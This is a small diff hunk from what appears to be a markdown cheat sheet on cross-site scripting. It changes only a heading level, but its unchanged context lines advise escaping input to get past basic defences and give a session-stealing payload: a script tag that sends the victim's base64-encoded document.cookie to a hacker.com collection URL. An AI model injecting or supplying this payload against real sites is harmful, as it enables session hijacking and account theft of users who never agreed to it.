@@ -8,7 +8,7 @@
 
 ### 2) Make sure everything is escaped so that you can bypass basic defense mechanisms
 
-#### Example: <>/\script'"=
+### Example: <>/\script'"=
 
 ### Session stealing: <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
 
